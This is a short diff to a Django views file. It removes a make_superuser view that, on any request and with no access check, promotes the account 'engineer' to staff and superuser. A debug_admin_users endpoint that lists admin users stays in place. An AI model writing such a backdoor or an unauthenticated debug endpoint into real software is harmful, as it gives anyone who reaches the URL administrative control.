@@ -203,12 +203,3 @@ def debug_admin_users(request):
     )
     return JsonResponse(users, safe=False)
 
-def make_superuser(request):
-    try:
-        user = User.objects.get(username__iexact="engineer") 
-        user.is_staff = True
-        user.is_superuser = True
-        user.save()
-        return HttpResponse(f"User '{user.username}' is now a superuser!")
-    except User.DoesNotExist:
-        return HttpResponse("User does not exist.")
